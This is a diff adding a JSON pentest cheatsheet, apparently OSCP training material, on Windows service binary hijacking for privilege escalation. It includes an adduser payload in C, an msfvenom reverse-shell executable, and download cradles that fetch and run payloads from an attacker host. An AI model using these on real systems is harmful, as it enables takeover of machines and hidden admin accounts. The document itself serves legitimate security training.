@@ -1,0 +1,260 @@
+{
+  "cheatsheets": [
+    {
+      "id": "windows-service-binary-hijacking",
+      "name": "Windows Service Binary Hijacking Privilege Escalation",
+      "description": "Complete methodology for exploiting writable Windows service binaries to escalate privileges to SYSTEM. When administrators install third-party software (XAMPP, custom applications), they often grant overly permissive write access to service binaries. If a low-privilege user can replace the service binary with a malicious payload, the payload executes with the service's privileges (typically LocalSystem/SYSTEM) when the service restarts. This technique requires: (1) Finding a service with a writable binary, (2) Creating a malicious payload, (3) Replacing the binary, and (4) Triggering service restart via direct command or system reboot. PowerUp.ps1 can automate detection but has known bugs with complex service paths - always verify manually.",
+      "category": "one-liners",
+      "oscp_relevance": "high",
+      "educational_header": {
+        "how_to_recognize": [
+          "Service binary paths outside C:\\Windows\\System32 (e.g., C:\\xampp, C:\\Program Files\\CustomApp)",
+          "icacls shows BUILTIN\\Users:(F) or (M) or (W) on service executable",
+          "Third-party or user-installed software services (MySQL, Apache, custom apps)",
+          "PowerUp Get-ModifiableServiceFile returns vulnerable services",
+          "Non-inherited (no 'I' prefix) Full/Modify permissions for low-privilege groups"
+        ],
+        "when_to_look_for": [
+          "Initial privilege escalation enumeration after gaining low-privilege shell",
+          "Target has XAMPP, WAMP, or similar development stacks installed",
+          "Custom enterprise software with services installed outside Windows directories",
+          "When automated tools (WinPEAS, PowerUp) flag service misconfigurations",
+          "Standard user needs path to SYSTEM without exploiting kernel vulnerabilities"
+        ],
+        "key_concepts": [
+          "Windows services run as specific accounts (LocalSystem = SYSTEM privileges)",
+          "Service binaries execute with service account privileges, not user privileges",
+          "Auto-start services execute binaries on system boot - no service restart needed",
+          "Permission mask: F=Full, M=Modify, RX=Read/Execute, R=Read, W=Write",
+          "Only need Write (W) or higher to replace binary"
+        ]
+      },
+      "scenarios": [
+        {
+          "title": "Scenario 1: Basic Service Binary Hijacking (XAMPP MySQL)",
+          "context": "You have RDP access as user 'dave' on a Windows workstation with XAMPP installed. You need SYSTEM privileges to access admin desktop files. WinPEAS or initial enumeration identified the mysql service running from C:\\xampp\\mysql\\bin\\mysqld.exe.",
+          "approach": "Phase 1: Service Enumeration (2 minutes)\n- List running services with paths: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n- Identify non-Windows paths (C:\\xampp, C:\\Program Files\\CustomApp)\n- Note the mysql service at C:\\xampp\\mysql\\bin\\mysqld.exe\n\nPhase 2: Permission Analysis (1 minute)\n- Check binary permissions: icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\"\n- Look for: BUILTIN\\Users:(F) - Full access for all users\n- Verify it's NOT just (RX) which is read/execute only\n\nPhase 3: Startup Type Check (30 seconds)\n- Verify auto-start: Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}\n- Confirm StartMode is 'Auto' (will start on reboot)\n\nPhase 4: Create Payload (2 minutes on Kali)\n- Write adduser.c with net user/localgroup commands\n- Cross-compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n- Start web server: python3 -m http.server 80\n\nPhase 5: Transfer and Replace (2 minutes)\n- Download payload: iwr -uri http://<LHOST>/adduser.exe -Outfile adduser.exe\n- Backup original: move C:\\xampp\\mysql\\bin\\mysqld.exe C:\\Users\\dave\\mysqld.exe.bak\n- Replace binary: move .\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe\n\nPhase 6: Trigger and Verify (3 minutes)\n- Try service restart: net stop mysql (expect 'Access denied')\n- Check shutdown privilege: whoami /priv (look for SeShutdownPrivilege)\n- Reboot system: shutdown /r /t 0\n- After reboot, verify: Get-LocalGroupMember administrators",
+          "commands": [
+            "win-service-binary-enum-running",
+            "win-icacls-binary-check",
+            "win-service-startmode-check",
+            "win-cross-compile-adduser",
+            "win-transfer-iwr",
+            "win-service-binary-replace",
+            "win-net-stop-service",
+            "win-whoami-shutdown-priv",
+            "win-shutdown-reboot",
+            "win-localgroup-admins-check"
+          ],
+          "expected_outcome": "New local administrator user 'dave2' created with password 'password123!'. Can now use runas /user:dave2 cmd followed by Start-Process powershell -Verb RunAs to get elevated shell.",
+          "why_this_works": "The mysql service runs as LocalSystem (SYSTEM privileges). When Windows starts the service, it executes the binary at the configured path with SYSTEM privileges. By replacing the legitimate mysqld.exe with our adduser payload, the system command 'net user' and 'net localgroup' execute as SYSTEM, which has permission to create local administrators."
+        },
+        {
+          "title": "Scenario 2: Reverse Shell via Service Binary",
+          "context": "You have a reverse shell on a Windows server and need SYSTEM access. A custom backup service has a writable binary. You prefer getting an immediate SYSTEM shell rather than creating a user account.",
+          "approach": "Phase 1: Identify Vulnerable Service (2 minutes)\n- Enumerate services: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n- Find custom service: BackupService at C:\\BackupTool\\backup.exe\n- Check permissions: icacls \"C:\\BackupTool\\backup.exe\"\n- Confirm Users have (F) or (M)\n\nPhase 2: Generate Reverse Shell Payload (1 minute on Kali)\n- Create payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o backup.exe\n- Verify: file backup.exe\n- Start web server: python3 -m http.server 80\n\nPhase 3: Setup Listener (30 seconds on Kali)\n- Start listener: nc -lvnp 4444\n\nPhase 4: Replace and Trigger (3 minutes)\n- Transfer payload: certutil -urlcache -f http://<LHOST>/backup.exe C:\\temp\\backup.exe\n- Backup original: copy C:\\BackupTool\\backup.exe C:\\BackupTool\\backup.exe.bak\n- Replace: copy C:\\temp\\backup.exe C:\\BackupTool\\backup.exe /Y\n- Verify startup type is Auto, then reboot: shutdown /r /t 0\n\nPhase 5: Receive SYSTEM Shell\n- Wait for callback on listener after reboot\n- Verify: whoami should show 'nt authority\\system'",
+          "commands": [
+            "win-service-binary-enum-running",
+            "win-icacls-binary-check",
+            "win-msfvenom-service-exe",
+            "win-transfer-iwr",
+            "win-service-binary-replace",
+            "win-shutdown-reboot"
+          ],
+          "expected_outcome": "Reverse shell callback received with SYSTEM privileges after system reboot. Full access to all files, registry, and ability to dump credentials.",
+          "why_this_works": "Service executes the binary with its configured account privileges. The reverse shell payload connects back to attacker before the service controller expects a proper response. While the service may 'fail to start' from Windows' perspective, the reverse shell connection is already established with SYSTEM privileges."
+        },
+        {
+          "title": "Scenario 3: PowerUp Automated Detection and Exploitation",
+          "context": "You want to quickly check for service binary hijacking opportunities using automation. Target has PowerShell and no application whitelisting.",
+          "approach": "Phase 1: Transfer and Load PowerUp (2 minutes)\n- Start web server on Kali: python3 -m http.server 80\n- On target: powershell -ep bypass\n- Download and load: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')\n\nPhase 2: Run Automated Check (30 seconds)\n- Execute: Get-ModifiableServiceFile\n- Review output for:\n  - ServiceName: Name of vulnerable service\n  - ModifiableFile: Path to writable binary\n  - ModifiableFilePermissions: Specific permissions\n  - StartName: LocalSystem means SYSTEM privileges\n  - CanRestart: Whether you can restart service\n  - AbuseFunction: Suggested exploitation command\n\nPhase 3: Attempt Automated Exploitation\n- If simple path: Install-ServiceBinary -Name '<ServiceName>'\n- Creates user john:Password123!\n- Restart service or reboot\n\nPhase 4: Handle PowerUp Failures\n- If Install-ServiceBinary throws error about 'not modifiable':\n  - This is a known bug with paths containing arguments\n  - Fall back to manual exploitation method\n  - Use icacls to verify permissions manually\n  - Proceed with manual binary replacement",
+          "commands": [
+            "win-powerup-modifiable-service",
+            "win-powerup-install-service-binary",
+            "win-icacls-binary-check",
+            "win-service-binary-replace"
+          ],
+          "expected_outcome": "Either automated exploitation creates john:Password123! user, or you identify the need for manual exploitation due to PowerUp bug with complex service paths.",
+          "why_this_works": "PowerUp's Get-ModifiableServiceFile queries all services and checks file permissions programmatically. It's faster than manual enumeration but has known limitations with service paths containing arguments. Always verify findings and be prepared for manual exploitation."
+        },
+        {
+          "title": "Scenario 4: Manual Verification When PowerUp Fails",
+          "context": "PowerUp's Get-ModifiableServiceFile found a vulnerable service but Install-ServiceBinary fails with 'not modifiable by the current user'. The service path is: C:\\xampp\\mysql\\bin\\mysqld.exe --defaults-file=c:\\xampp\\mysql\\bin\\my.ini mysql",
+          "approach": "Phase 1: Understand the Bug (1 minute)\n- PowerUp's Install-ServiceBinary uses Get-ModifiablePath internally\n- Get-ModifiablePath fails when PathName contains arguments with paths\n- The '--defaults-file=c:\\xampp\\...' argument confuses the parser\n- This is a known false negative - the binary IS writable\n\nPhase 2: Manual Verification (1 minute)\n- Extract just the binary path: C:\\xampp\\mysql\\bin\\mysqld.exe\n- Check permissions: icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\"\n- Confirm BUILTIN\\Users:(F) - Full access\n- This proves PowerUp gave false negative\n\nPhase 3: Manual Exploitation (5 minutes)\n- Create payload on Kali: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n- Transfer to target: iwr -uri http://<LHOST>/adduser.exe -Outfile adduser.exe\n- Backup original: move C:\\xampp\\mysql\\bin\\mysqld.exe mysqld.exe.bak\n- Replace: move .\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe\n- Check if can restart: net stop mysql (likely 'Access denied')\n- Verify auto-start: sc qc mysql | findstr START_TYPE\n- Reboot: shutdown /r /t 0\n\nPhase 4: Verify Success (1 minute)\n- After reboot: Get-LocalGroupMember administrators\n- Confirm new user dave2 exists",
+          "commands": [
+            "win-powerup-modifiable-service",
+            "win-icacls-binary-check",
+            "win-cross-compile-adduser",
+            "win-transfer-iwr",
+            "win-service-binary-replace",
+            "win-shutdown-reboot",
+            "win-localgroup-admins-check"
+          ],
+          "expected_outcome": "Manual exploitation succeeds where PowerUp automation failed. New admin user created. Lesson: Never blindly trust automated tools - always verify manually.",
+          "why_this_works": "PowerUp's Install-ServiceBinary has a parsing bug that causes false negatives when service PathName contains arguments with paths. The underlying vulnerability is real - the binary file IS writable. Manual exploitation bypasses the buggy parsing logic and directly replaces the file."
+        },
+        {
+          "title": "Scenario 5: Service Binary Hijacking Without Reboot Capability",
+          "context": "You found a writable service binary but: (1) Cannot restart the service (Access denied), (2) Service is not Auto-start, and (3) User lacks SeShutdownPrivilege. Need alternative approach.",
+          "approach": "Phase 1: Verify the Constraints (2 minutes)\n- Confirm can't restart: net stop <service> shows 'Access is denied'\n- Check startup type: sc qc <service> shows START_TYPE: DEMAND_START (Manual)\n- Check shutdown privilege: whoami /priv - SeShutdownPrivilege not listed\n\nPhase 2: Alternative Strategies\nOption A - Wait for scheduled reboot:\n  - Document finding and wait for IT maintenance window\n  - Replace binary now, exploitation happens on next reboot\n  - Continue with other privesc vectors in meantime\n\nOption B - Find different service:\n  - Look for Auto-start services with writable binaries\n  - Get-CimInstance -ClassName win32_service | Where-Object {$_.StartMode -eq 'Auto'} | Select Name,PathName\n  - Check permissions on each\n\nOption C - Social engineering:\n  - If internal pentest, request 'test reboot' from IT\n  - Document as finding: 'Exploitation requires system reboot'\n\nOption D - Check for other restart triggers:\n  - Service dependencies: sc qc <service> - check DEPENDENCIES\n  - If dependent on restartable service, restart parent\n  - Check scheduled tasks that might restart service\n\nPhase 3: Document and Pivot (1 minute)\n- Add to failed_attempts.md with reasoning\n- Note: 'Binary writable but no restart path - requires scheduled reboot'\n- Move to next privesc vector (DLL hijacking, unquoted paths, etc.)",
+          "commands": [
+            "win-net-stop-service",
+            "win-service-startmode-check",
+            "win-whoami-shutdown-priv",
+            "win-service-binary-enum-running"
+          ],
+          "expected_outcome": "Either identify alternative restart method, find different auto-start service, or document as 'requires reboot' and pivot to other techniques.",
+          "why_this_works": "Service binary hijacking requires the service to execute the replaced binary. Without ability to restart service or reboot system, exploitation is delayed until external trigger occurs. In OSCP, always look for auto-start services first to ensure you can complete the attack chain."
+        }
+      ],
+      "sections": [
+        {
+          "title": "1. Service Enumeration",
+          "notes": "First step is identifying services with binaries outside protected Windows directories. Focus on user-installed software (XAMPP, custom apps, third-party tools) which are more likely to have weak permissions.\n\nImportant: Network logons (WinRM, reverse shells) may get 'Access denied' on WMI queries. Use RDP/interactive logon if possible.",
+          "commands": [
+            {
+              "id": "win-service-binary-enum-running",
+              "example": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
+              "shows": "List of running services with binary paths - focus on non-C:\\Windows paths"
+            },
+            {
+              "id": "win-wmic-service-path",
+              "example": "wmic service get Name,PathName,StartMode,State",
+              "shows": "Alternative using WMIC (CMD compatible)"
+            },
+            {
+              "id": "win-sc-query-config",
+              "example": "sc qc mysql",
+              "shows": "Detailed service configuration including BINARY_PATH_NAME and SERVICE_START_NAME"
+            }
+          ]
+        },
+        {
+          "title": "2. Permission Analysis",
+          "notes": "Check if current user can write to service binary. Permission mask:\n  F  = Full access (VULNERABLE)\n  M  = Modify access (VULNERABLE)\n  W  = Write-only (VULNERABLE)\n  RX = Read/Execute (NOT vulnerable)\n  R  = Read-only (NOT vulnerable)\n\nLook for: BUILTIN\\Users:(F), Everyone:(M), Authenticated Users:(W)",
+          "commands": [
+            {
+              "id": "win-icacls-binary-check",
+              "example": "icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\"",
+              "shows": "Permission list - look for (F), (M), or (W) for low-priv groups"
+            },
+            {
+              "id": "win-get-acl-check",
+              "example": "Get-Acl \"C:\\xampp\\mysql\\bin\\mysqld.exe\" | Format-List",
+              "shows": "PowerShell alternative with detailed access rules"
+            }
+          ]
+        },
+        {
+          "title": "3. Payload Creation",
+          "notes": "Two main approaches:\n1. Adduser payload - Creates local admin user (no network callback needed)\n2. Reverse shell - Immediate SYSTEM shell (requires network connectivity)\n\nAdduser.c template:\n```c\n#include <stdlib.h>\nint main() {\n  int i;\n  i = system(\"net user dave2 password123! /add\");\n  i = system(\"net localgroup administrators dave2 /add\");\n  return 0;\n}\n```",
+          "commands": [
+            {
+              "id": "win-cross-compile-adduser",
+              "example": "x86_64-w64-mingw32-gcc adduser.c -o adduser.exe",
+              "shows": "64-bit Windows executable created (use i686-w64-mingw32-gcc for 32-bit)"
+            },
+            {
+              "id": "win-msfvenom-service-exe",
+              "example": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=4444 -f exe -o service.exe",
+              "shows": "Reverse shell payload (start listener before triggering!)"
+            }
+          ]
+        },
+        {
+          "title": "4. Binary Replacement",
+          "notes": "ALWAYS backup the original binary before replacement. This allows restoration after exploitation and helps avoid detection/system issues.\n\nWorkflow: Backup original -> Transfer payload -> Replace binary",
+          "commands": [
+            {
+              "id": "win-transfer-iwr",
+              "example": "iwr -uri http://192.168.45.5/adduser.exe -Outfile C:\\Users\\dave\\adduser.exe",
+              "shows": "Download payload from attacker's web server"
+            },
+            {
+              "id": "win-service-binary-replace",
+              "example": "move C:\\xampp\\mysql\\bin\\mysqld.exe C:\\Users\\dave\\mysqld.exe.bak && move C:\\Users\\dave\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe",
+              "shows": "Atomic backup and replace operation"
+            }
+          ]
+        },
+        {
+          "title": "5. Service Restart Methods",
+          "notes": "To trigger payload execution, service must restart. Three approaches:\n1. Direct restart (requires admin - usually fails)\n2. System reboot (requires SeShutdownPrivilege + Auto-start service)\n3. Wait for external trigger (scheduled reboot, IT maintenance)\n\nAlways check startup type before attempting reboot!",
+          "commands": [
+            {
+              "id": "win-net-stop-service",
+              "example": "net stop mysql",
+              "shows": "Attempt direct stop (expect 'Access is denied' for low-priv user)"
+            },
+            {
+              "id": "win-service-startmode-check",
+              "example": "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}",
+              "shows": "Check if service is Auto-start (required for reboot method)"
+            },
+            {
+              "id": "win-whoami-shutdown-priv",
+              "example": "whoami /priv",
+              "shows": "Look for SeShutdownPrivilege (even if 'Disabled', privilege is available)"
+            },
+            {
+              "id": "win-shutdown-reboot",
+              "example": "shutdown /r /t 0",
+              "shows": "Immediate reboot - triggers auto-start services after boot"
+            }
+          ]
+        },
+        {
+          "title": "6. Verification",
+          "notes": "After service restart/reboot, verify exploitation succeeded:\n- Adduser payload: Check local administrators group\n- Reverse shell: Check listener for SYSTEM shell callback\n\nIf verification fails, check Event Viewer for service errors.",
+          "commands": [
+            {
+              "id": "win-localgroup-admins-check",
+              "example": "Get-LocalGroupMember administrators",
+              "shows": "New user (dave2) should appear in list"
+            },
+            {
+              "id": "win-net-localgroup",
+              "example": "net localgroup administrators",
+              "shows": "CMD alternative to verify admin group membership"
+            }
+          ]
+        },
+        {
+          "title": "7. Automated Detection (PowerUp)",
+          "notes": "PowerUp.ps1 can automate service binary hijacking detection. However, it has KNOWN BUGS with complex service paths.\n\nKnown Issue: Install-ServiceBinary fails when service PathName contains arguments with paths (e.g., --defaults-file=c:\\path).\n\nAlways verify PowerUp findings manually before exploitation!",
+          "commands": [
+            {
+              "id": "win-powerup-import",
+              "example": "powershell -ep bypass; . .\\PowerUp.ps1",
+              "shows": "Bypass execution policy and import PowerUp module"
+            },
+            {
+              "id": "win-powerup-modifiable-service",
+              "example": "Get-ModifiableServiceFile",
+              "shows": "Automated scan for writable service binaries"
+            },
+            {
+              "id": "win-powerup-install-service-binary",
+              "example": "Install-ServiceBinary -Name 'mysql'",
+              "shows": "Automated exploitation (creates john:Password123!) - may fail on complex paths"
+            }
+          ]
+        }
+      ],
+      "tags": [
+        "WINDOWS",
+        "PRIVILEGE_ESCALATION",
+        "SERVICE_HIJACKING",
+        "BINARY_HIJACKING",
+        "OSCP:HIGH",
+        "POST_EXPLOITATION",
+        "POWERUP",
+        "MINGW",
+        "CROSS_COMPILE",
+        "ICACLS",
+        "PERMISSIONS",
+        "LOCALSYSTEM"
+      ]
+    }
+  ]
+}
